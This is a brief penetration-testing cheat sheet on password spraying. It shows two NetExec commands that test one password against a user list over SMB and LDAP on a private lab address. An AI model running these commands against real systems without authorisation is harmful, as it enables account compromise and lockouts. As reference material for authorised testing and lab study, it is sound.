# Password Spraying

## nxc
Test a single password value with a list of user names
SMB Example:
```
nxc smb 10.0.2.15 -u users.txt -p Password1 --continue-on-success
```
LDAP Example:
```
nxc ldap 10.0.2.15 -u users.txt -p Password1 --continue-on-success
```
